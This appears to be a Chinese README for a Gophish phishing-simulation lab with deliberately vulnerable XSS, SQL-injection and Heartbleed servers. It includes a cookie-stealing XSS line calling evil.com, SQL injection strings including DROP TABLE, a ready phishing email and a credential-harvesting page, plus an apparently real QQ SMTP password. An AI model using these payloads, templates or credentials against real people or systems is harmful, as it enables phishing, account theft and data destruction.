# 🎯 Gophish 钓鱼平台 + 钓后仿真系统

基于 Gophish 的完整钓鱼攻击和钓后仿真系统，包含多个漏洞服务器和可视化损失评估仪表板。

## 🚀 快速开始

### 1. 系统要求
- Python 3.7+
- macOS/Linux/Windows
- 网络连接

### 2. 安装依赖
```bash
pip3 install flask requests
```

### 3. 启动系统
```bash
# 方法1: 使用测试脚本（推荐）
python3 test_servers.py

# 方法2: 使用启动脚本
chmod +x start_simulation.sh
./start_simulation.sh
```

## 📋 系统组件

### 🎣 Gophish 钓鱼平台
- **端口**: 3333 (HTTPS)
- **功能**: 钓鱼邮件发送、统计分析
- **访问**: https://localhost:3333
- **默认账户**: admin / (系统生成密码)

### 💰 损失评估仪表板
- **端口**: 5000
- **功能**: 实时攻击统计、损失评估、风险分析
- **访问**: http://localhost:5000
- **特性**: 
  - 实时攻击数据可视化
  - 经济损失估算
  - 风险等级评估
  - 攻击时间线分析

### 🚨 XSS 漏洞服务器
- **端口**: 5001
- **模拟**: 企业内部反馈系统
- **漏洞**: 存储型XSS漏洞
- **访问**: http://localhost:5001
- **测试方法**: 
  ```html
  <script>alert('XSS攻击成功！')</script>
  <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
  ```

### 💾 SQL注入服务器
- **端口**: 5002
- **模拟**: 员工信息查询系统
- **漏洞**: SQL注入漏洞
- **访问**: http://localhost:5002
- **测试方法**:
  ```sql
  1001' OR '1'='1
  ' UNION SELECT * FROM employees--
  1'; DROP TABLE employees--
  ```

### 🔐 Heartbleed 仿真服务器
- **端口**: 5003
- **模拟**: SSL/TLS 通信服务
- **漏洞**: CVE-2014-0160 Heartbleed
- **访问**: http://localhost:5003
- **特性**: 
  - 模拟内存泄露
  - 展示敏感数据暴露
  - SSL/TLS安全测试

## 🔧 配置指南

### 1. 配置 Gophish
1. 访问 https://localhost:3333
2. 使用 admin 账户登录
3. 配置发送配置文件（Sending Profiles）：
   ```
   Name: QQ邮箱
   From: 809050685@qq.com
   Host: smtp.qq.com:465
   Username: 809050685@qq.com
   Password: xutqpejdkpfcbbhi
   ```

### 2. 创建钓鱼邮件模板
```html
Subject: 【紧急】系统安全升级通知

尊敬的用户，

我们的系统将进行重要安全升级，请立即点击以下链接完成必要的验证：
{{.URL}}

如不及时处理，您的账户可能被暂时冻结。

IT部门
```

### 3. 创建钓鱼页面
```html
<!DOCTYPE html>
<html>
<head>
    <title>企业安全验证系统</title>
    <style>
        body { font-family: Arial; margin: 40px; background: #f5f5f5; }
        .login-box { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>系统安全验证</h2>
        <p>为确保账户安全，请输入您的登录凭据：</p>
        <form method="POST">
            <input type="email" name="email" placeholder="邮箱地址" required>
            <input type="password" name="password" placeholder="密码" required>
            <button type="submit">验证身份</button>
        </form>
    </div>
    {{.Tracker}}
</body>
</html>
```

## 🎯 使用流程

### 第一阶段：钓鱼攻击
1. **配置邮箱**: 在 Gophish 中设置 QQ 邮箱 SMTP
2. **创建模板**: 设计诱人的钓鱼邮件
3. **添加目标**: 创建用户组，添加目标邮箱
4. **创建页面**: 设计钓鱼登录页面
5. **发起活动**: 启动钓鱼邮件活动

### 第二阶段：钓后利用
1. **用户点击**: 目标用户点击邮件链接
2. **凭据收集**: 用户在钓鱼页面输入凭据
3. **重定向攻击**: 将用户引导至漏洞服务器
4. **触发漏洞**: 执行 XSS、SQL注入或 Heartbleed 攻击
5. **数据收集**: 记录攻击过程和敏感数据

### 第三阶段：损失评估
1. **统计分析**: 查看 Gophish 的详细统计
2. **损失计算**: 在仪表板查看经济损失估算
3. **风险评估**: 分析不同攻击的影响范围
4. **报告生成**: 输出完整的安全评估报告

## 📊 损失评估模型

### XSS 攻击损失
- **单次损失**: ¥50,000
- **影响范围**: 用户数据泄露、会话劫持
- **风险等级**: HIGH

### SQL注入攻击损失  
- **单次损失**: ¥200,000
- **影响范围**: 数据库完全暴露、客户信息泄露
- **风险等级**: CRITICAL

### Heartbleed攻击损失
- **单次损失**: ¥300,000
- **影响范围**: 私钥泄露、系统全面沦陷  
- **风险等级**: CRITICAL

## 🛡️ 安全测试场景

### 场景1: 企业内部钓鱼测试
1. 发送"系统升级"钓鱼邮件
2. 收集员工登录凭据
3. 模拟内部系统XSS攻击
4. 评估数据泄露风险

### 场景2: 财务系统渗透测试
1. 发送"工资条查看"钓鱼邮件
2. 引导至员工查询系统
3. 执行SQL注入攻击
4. 获取所有员工敏感信息

### 场景3: 基础设施安全测试
1. 社工获得系统管理员凭据
2. 访问SSL/TLS通信系统
3. 执行Heartbleed攻击
4. 获取服务器私钥和内存数据

## 📁 项目结构

```
gophish基础实验/
├── gophish                           # Gophish 主程序
├── config.json                       # Gophish 配置文件
├── vulnerable_servers/                # 漏洞服务器
│   ├── web_xss/
│   │   └── xss_server.py             # XSS漏洞服务器
│   ├── db_sqli/
│   │   └── sqli_server.py            # SQL注入服务器
│   └── heartbleed_sim/
│       └── heartbleed_server.py      # Heartbleed仿真服务器
├── dashboard/
│   └── dashboard.py                  # 损失评估仪表板
├── logs/
│   └── attacks.log                   # 攻击日志
├── test_servers.py                   # 服务器测试脚本
├── start_simulation.sh               # 启动脚本
├── GOPHISH_CONFIG.md                 # 详细配置指南
└── README.md                         # 项目说明
```

## 🔍 日志分析

### 攻击日志格式
```json
{
    "timestamp": "2025-01-20T09:00:00",
    "type": "XSS",
    "details": "XSS攻击检测: 192.168.1.100 - <script>alert('XSS')</script>",
    "severity": "HIGH"
}
```

### 日志类型
- **XSS**: 跨站脚本攻击
- **SQL_INJECTION**: SQL注入攻击
- **HEARTBLEED**: Heartbleed漏洞利用

## ⚠️ 重要提醒

### 合法使用
- **仅用于安全研究和培训**
- **需要获得明确授权**
- **不得攻击真实系统**
- **遵守相关法律法规**

### 测试环境建议
- 使用隔离的测试网络
- 仅对自己的系统进行测试
- 保护测试数据的安全性
- 及时清理测试痕迹

## 🆘 故障排除

### 常见问题

1. **服务器无法启动**
   ```bash
   # 检查端口占用
   lsof -i :5000
   
   # 安装依赖
   pip3 install flask requests
   ```

2. **Gophish无法发送邮件**
   - 检查QQ邮箱SMTP设置
   - 确认授权码正确
   - 检查防火墙设置

3. **漏洞服务器无响应**
   - 检查Python版本
   - 查看错误日志
   - 确认端口未被占用

### 获取帮助
- 查看 `GOPHISH_CONFIG.md` 详细配置
- 检查终端错误输出
- 使用 `test_servers.py` 诊断问题

## 📞 技术支持

如遇到问题，请：
1. 检查系统依赖是否完整
2. 查看详细的错误日志
3. 确认网络和防火墙设置
4. 参考配置指南进行排查

---

**免责声明**: 本系统仅用于网络安全研究和员工安全意识培训，请勿用于任何非法用途。使用者需自行承担使用风险和法律责任。